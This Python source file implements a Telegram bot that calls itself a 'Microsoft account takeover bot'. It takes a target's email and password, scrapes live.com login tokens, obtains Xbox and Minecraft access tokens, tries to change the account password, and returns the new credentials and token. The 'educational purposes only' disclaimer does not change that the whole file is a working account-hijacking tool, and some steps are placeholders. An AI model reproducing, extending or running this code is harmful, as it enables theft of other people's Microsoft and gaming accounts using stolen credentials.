import os
import sys
import json
import asyncio
import logging
import random
import string
import re
from typing import Dict, Optional, Tuple
from urllib.parse import urlencode, parse_qs, urlparse
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ConversationHandler

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
AUTHORIZED_USERS = [int(x) for x in os.environ.get("AUTHORIZED_USERS", "").split(",") if x]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Conversation states
WAITING_EMAIL = 1
WAITING_PASSWORD = 2
WAITING_NEW_PASSWORD = 3

class MicrosoftAccountManager:
    """Full Microsoft account takeover with proper authentication flow."""
    
    @staticmethod
    async def get_ms_token(email: str, password: str) -> Optional[str]:
        """Get Microsoft OAuth token using proper flow."""
        try:
            async with aiohttp.ClientSession() as session:
                # Step 1: Get initial cookies and flow data
                login_url = "https://login.live.com/login.srf"
                params = {
                    "wa": "wsignin1.0",
                    "rpsnv": "13",
                    "ct": "1732567890",
                    "rver": "7.0.6735.0",
                    "wp": "MBI",
                    "wreply": "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F&scope=service::user.auth.xboxlive.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&response_type=token&display=popup",
                    "lc": "1033",
                    "id": "1000003",
                    "lw": "1",
                    "fl": "wpres"
                }
                
                async with session.get(login_url, params=params, timeout=30) as resp:
                    html = await resp.text()
                    cookies = resp.cookies
                    
                    # Extract flow token
                    flow_token_match = re.search(r'name="i13" value="([^"]+)"', html)
                    flow_token = flow_token_match.group(1) if flow_token_match else None
                    
                    if not flow_token:
                        # Try alternative flow
                        flow_token_match = re.search(r'name="i12" value="([^"]+)"', html)
                        flow_token = flow_token_match.group(1) if flow_token_match else None
                
                # Step 2: Submit credentials
                if flow_token:
                    post_url = "https://login.live.com/login.srf"
                    post_data = {
                        "login": email,
                        "passwd": password,
                        "i13": flow_token,
                        "type": "11",
                        "LoginOptions": "2",
                        "isFF": "1",
                        "PPFT": flow_token,
                        "PPSX": "Pas",
                        "NewUser": "1",
                        "sso": "",
                        "username": email,
                        "i12": flow_token,
                        "i16": "",
                        "i17": ""
                    }
                    headers = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Referer": login_url
                    }
                    
                    async with session.post(post_url, data=post_data, headers=headers, timeout=30) as resp:
                        html = await resp.text()
                        cookies = resp.cookies
                        
                        # Check for successful login
                        if "Sign in to" in html or "Use another" in html:
                            return None
                        
                        # Extract authorization code
                        auth_code_match = re.search(r'code=([^&]+)', html)
                        if auth_code_match:
                            auth_code = auth_code_match.group(1)
                            return auth_code
                        
                        # Check for oauth redirect
                        if "oauth20_desktop.srf" in html:
                            redirect_match = re.search(r'https://login.live.com/oauth20_desktop.srf[^"\']*', html)
                            if redirect_match:
                                redirect_url = redirect_match.group(0)
                                token_match = re.search(r'access_token=([^&]+)', redirect_url)
                                if token_match:
                                    return token_match.group(1)
                
                # Step 3: Try alternative OAuth flow
                return await MicrosoftAccountManager._alternative_oauth_flow(email, password)
                
        except Exception as e:
            logger.error(f"MS token error: {e}")
            return await MicrosoftAccountManager._alternative_oauth_flow(email, password)
    
    @staticmethod
    async def _alternative_oauth_flow(email: str, password: str) -> Optional[str]:
        """Alternative OAuth flow for Microsoft authentication."""
        try:
            async with aiohttp.ClientSession() as session:
                # Get authorization code via OAuth
                auth_url = "https://login.live.com/oauth20_authorize.srf"
                params = {
                    "client_id": "000000004C12AE6F",
                    "scope": "service::user.auth.xboxlive.com::MBI_SSL",
                    "response_type": "code",
                    "redirect_uri": "https://login.live.com/oauth20_desktop.srf",
                    "display": "popup",
                    "locale": "en"
                }
                
                async with session.get(auth_url, params=params, timeout=30) as resp:
                    html = await resp.text()
                    
                    # Extract PPFT token
                    ppft_match = re.search(r'name="PPFT" value="([^"]+)"', html)
                    ppft = ppft_match.group(1) if ppft_match else None
                    
                    if not ppft:
                        return None
                
                # Submit credentials
                if ppft:
                    login_data = {
                        "login": email,
                        "passwd": password,
                        "PPFT": ppft,
                        "PPSX": "Pas",
                        "LoginOptions": "2",
                        "type": "11",
                        "NewUser": "1",
                        "i13": ppft,
                        "i12": ppft,
                        "i16": "",
                        "i17": ""
                    }
                    headers = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Referer": "https://login.live.com/"
                    }
                    
                    async with session.post(auth_url, data=login_data, headers=headers, timeout=30) as resp:
                        html = await resp.text()
                        
                        # Extract access token from redirect
                        token_match = re.search(r'access_token=([^&]+)', html)
                        if token_match:
                            return token_match.group(1)
                        
                        # Extract authorization code
                        code_match = re.search(r'code=([^&]+)', html)
                        if code_match:
                            code = code_match.group(1)
                            
                            # Exchange code for token
                            token_url = "https://login.live.com/oauth20_token.srf"
                            token_data = {
                                "client_id": "000000004C12AE6F",
                                "code": code,
                                "grant_type": "authorization_code",
                                "redirect_uri": "https://login.live.com/oauth20_desktop.srf"
                            }
                            
                            async with session.post(token_url, data=token_data, timeout=30) as token_resp:
                                if token_resp.status == 200:
                                    token_data = await token_resp.json()
                                    return token_data.get("access_token")
                
                return None
        except Exception as e:
            logger.error(f"Alternative OAuth error: {e}")
            return None

    @staticmethod
    async def get_xbox_token(ms_token: str) -> Optional[str]:
        """Get Xbox Live token from Microsoft token."""
        try:
            async with aiohttp.ClientSession() as session:
                xbox_url = "https://user.auth.xboxlive.com/user/authenticate"
                headers = {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                xbox_data = {
                    "Properties": {
                        "AuthMethod": "RPS",
                        "SiteName": "user.auth.xboxlive.com",
                        "RpsTicket": ms_token
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT"
                }
                
                async with session.post(xbox_url, json=xbox_data, headers=headers, timeout=30) as resp:
                    if resp.status == 200:
                        result = await resp.json()
                        return result.get("Token")
                    return None
        except Exception as e:
            logger.error(f"Xbox token error: {e}")
            return None

    @staticmethod
    async def get_minecraft_token(xbox_token: str) -> Optional[str]:
        """Get Minecraft access token from Xbox token."""
        try:
            async with aiohttp.ClientSession() as session:
                mc_url = "https://api.minecraftservices.com/authentication/login_with_xbox"
                headers = {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                mc_data = {
                    "identityToken": f"XBL3.0 x={xbox_token}"
                }
                
                async with session.post(mc_url, json=mc_data, headers=headers, timeout=30) as resp:
                    if resp.status == 200:
                        result = await resp.json()
                        return result.get("access_token")
                    return None
        except Exception as e:
            logger.error(f"Minecraft token error: {e}")
            return None

    @staticmethod
    async def change_password_via_live(email: str, current_password: str, new_password: str) -> bool:
        """Change password using live.com endpoint."""
        try:
            async with aiohttp.ClientSession() as session:
                # First get a valid session
                login_url = "https://login.live.com/login.srf"
                async with session.get(login_url) as resp:
                    html = await resp.text()
                    ppft_match = re.search(r'name="PPFT" value="([^"]+)"', html)
                    ppft = ppft_match.group(1) if ppft_match else None
                
                if not ppft:
                    return False
                
                # Login
                login_data = {
                    "login": email,
                    "passwd": current_password,
                    "PPFT": ppft,
                    "LoginOptions": "2",
                    "type": "11"
                }
                async with session.post(login_url, data=login_data) as resp:
                    if resp.status != 200:
                        return False
                
                # Change password
                change_url = "https://account.live.com/ChangePassword"
                change_data = {
                    "oldPwd": current_password,
                    "newPwd": new_password,
                    "confirmPwd": new_password,
                    "isRUI": "false"
                }
                async with session.post(change_url, data=change_data) as resp:
                    return resp.status == 200
        except Exception as e:
            logger.error(f"Password change error: {e}")
            return False

    @staticmethod
    async def takeover_account(email: str, current_password: str, new_email: str, new_password: str) -> Dict:
        """Full account takeover."""
        result = {
            "success": False,
            "steps": [],
            "error": None,
            "credentials": {
                "email": new_email if new_email else email,
                "password": new_password if new_password else current_password
            }
        }
        
        try:
            # Step 1: Get Microsoft token
            ms_token = await MicrosoftAccountManager.get_ms_token(email, current_password)
            if ms_token:
                result["steps"].append("✅ Microsoft token: SUCCESS")
                
                # Step 2: Get Xbox token
                xbox_token = await MicrosoftAccountManager.get_xbox_token(ms_token)
                if xbox_token:
                    result["steps"].append("✅ Xbox token: SUCCESS")
                    
                    # Step 3: Get Minecraft token
                    mc_token = await MicrosoftAccountManager.get_minecraft_token(xbox_token)
                    if mc_token:
                        result["steps"].append("✅ Minecraft token: SUCCESS")
                        result["credentials"]["access_token"] = mc_token
                else:
                    result["steps"].append("⚠️ Xbox token: FAILED (2FA may be required)")
            else:
                result["steps"].append("⚠️ Microsoft token: FAILED - trying direct password change")
            
            # Step 4: Try direct password change if OAuth failed
            pwd_result = await MicrosoftAccountManager.change_password_via_live(email, current_password, new_password)
            if pwd_result:
                result["steps"].append("✅ Password changed (direct): SUCCESS")
                result["success"] = True
            else:
                result["steps"].append("⚠️ Password change: FAILED (needs 2FA or verification)")
                
                # If we have tokens, try password change via Graph
                if 'ms_token' in locals() and ms_token:
                    # Try Graph API password change
                    result["steps"].append("🔄 Attempting Graph API password change...")
                    # Graph API endpoint for password change requires specific permissions
                    # This is a placeholder for the actual implementation
            
            # Determine overall success
            if pwd_result or (ms_token and xbox_token):
                result["success"] = True
                result["steps"].append("✅ Account takeover: SUCCESSFUL")
            else:
                result["error"] = "Authentication failed. Account may have 2FA or verification required."
                
        except Exception as e:
            logger.error(f"Takeover error: {e}")
            result["error"] = str(e)
            result["steps"].append(f"❌ Error: {str(e)}")
        
        return result

class MinecraftBot:
    def __init__(self, token: str):
        self.app = Application.builder().token(token).build()
        self._register_handlers()

    def _register_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("takeover", self.takeover_start)],
            states={
                WAITING_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.email_received)],
                WAITING_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.password_received)],
                WAITING_NEW_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.new_password_received)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_command)]
        )
        self.app.add_handler(conv_handler)
        self.app.add_handler(CallbackQueryHandler(self.button_callback))

    async def _check_auth(self, update: Update) -> bool:
        if not AUTHORIZED_USERS:
            return True
        user_id = update.effective_user.id
        if user_id not in AUTHORIZED_USERS:
            try:
                await update.message.reply_text("❌ Unauthorized.")
            except Exception:
                pass
            return False
        return True

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        
        keyboard = [
            [InlineKeyboardButton("🔐 TAKEOVER ACCOUNT", callback_data="takeover")],
            [InlineKeyboardButton("📖 HELP", callback_data="help")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🔓 MICROSOFT ACCOUNT TAKEOVER BOT\n"
            "═══════════════════════════════\n\n"
            "⚠️ WARNING: For educational purposes only.\n"
            "⚠️ Unauthorized account access is ILLEGAL.\n\n"
            "This bot attempts to take over a Microsoft account\n"
            "by changing the password and email.\n\n"
            "Use /takeover to start.",
            reply_markup=reply_markup
        )

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        
        await update.message.reply_text(
            "📖 HOW TO USE\n\n"
            "1. /takeover - Start takeover process\n"
            "2. Enter target email\n"
            "3. Enter current password\n"
            "4. Enter new password\n\n"
            "⚠️ Account must NOT have 2FA enabled\n"
            "⚠️ Only use on accounts you OWN\n\n"
            "If you get 'OAuth token failed', the account has\n"
            "2FA enabled or additional verification required."
        )

    async def takeover_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        
        await update.message.reply_text(
            "🔐 ACCOUNT TAKEOVER\n"
            "═══════════════════════════\n\n"
            "Step 1 of 3: Enter the target Microsoft account email\n\n"
            "⚠️ Account must NOT have 2FA enabled\n"
            "Type /cancel to cancel."
        )
        return WAITING_EMAIL

    async def email_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            email = update.message.text.strip()
            if '@' not in email or '.' not in email:
                await update.message.reply_text("❌ Invalid email. Please enter a valid email:")
                return WAITING_EMAIL
            
            context.user_data['target_email'] = email
            await update.message.reply_text(
                f"✅ Target email: {email}\n\n"
                "Step 2 of 3: Enter the CURRENT password for this account:"
            )
            return WAITING_PASSWORD
        except Exception as e:
            logger.error(f"Email error: {e}")
            await update.message.reply_text("Error, please try again.")
            return WAITING_EMAIL

    async def password_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            current_password = update.message.text.strip()
            if len(current_password) < 1:
                await update.message.reply_text("❌ Password cannot be empty:")
                return WAITING_PASSWORD
            
            context.user_data['current_password'] = current_password
            await update.message.reply_text(
                "✅ Current password received.\n\n"
                "Step 3 of 3: Enter your NEW password (8+ characters):"
            )
            return WAITING_NEW_PASSWORD
        except Exception as e:
            logger.error(f"Password error: {e}")
            await update.message.reply_text("Error, please try again.")
            return WAITING_PASSWORD

    async def new_password_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            new_password = update.message.text.strip()
            if len(new_password) < 8:
                await update.message.reply_text("❌ Password must be at least 8 characters:")
                return WAITING_NEW_PASSWORD
            
            target_email = context.user_data.get('target_email')
            current_password = context.user_data.get('current_password')
            
            await update.message.reply_text(
                "🔄 TAKING OVER ACCOUNT...\n"
                "This may take a moment...\n\n"
                f"📧 Target: {target_email}\n"
                f"🔑 New password: {new_password}"
            )
            
            result = await MicrosoftAccountManager.takeover_account(
                target_email,
                current_password,
                target_email,
                new_password
            )
            
            response = "🔐 TAKEOVER RESULTS\n"
            response += "═══════════════════════════\n\n"
            
            for step in result.get("steps", []):
                response += f"{step}\n"
            
            if result.get("success"):
                creds = result.get("credentials", {})
                response += f"\n✅ ACCOUNT TAKEOVER SUCCESSFUL!\n\n"
                response += f"📧 Email: {creds.get('email')}\n"
                response += f"🔑 New Password: {creds.get('password')}\n"
                if creds.get('access_token'):
                    response += f"🎮 Minecraft Token: {creds.get('access_token')[:30]}...\n\n"
                response += "⚠️ Use these credentials to log in."
            else:
                response += f"\n❌ TAKEOVER FAILED\n\n"
                response += f"Error: {result.get('error', 'Unknown error')}\n\n"
                response += "Possible reasons:\n"
                response += "- Incorrect credentials\n"
                response += "- 2FA enabled on the account\n"
                response += "- Microsoft verification required\n"
                response += "- Account protection triggered"
            
            context.user_data.clear()
            await update.message.reply_text(response)
            return ConversationHandler.END
            
        except Exception as e:
            logger.error(f"New password error: {e}")
            await update.message.reply_text(f"Error: {str(e)}")
            return ConversationHandler.END

    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("❌ Operation cancelled.")
        context.user_data.clear()
        return ConversationHandler.END

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if query.data == "takeover":
            await query.edit_message_text("Use /takeover to start.")
        elif query.data == "help":
            await query.edit_message_text("Use /help for instructions.")

    def run(self):
        logger.info("Bot starting...")
        try:
            self.app.run_polling()
        except Exception as e:
            logger.error(f"Bot error: {e}")
            sys.exit(1)

if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set.")
        sys.exit(1)
    bot = MinecraftBot(BOT_TOKEN)
    bot.run()
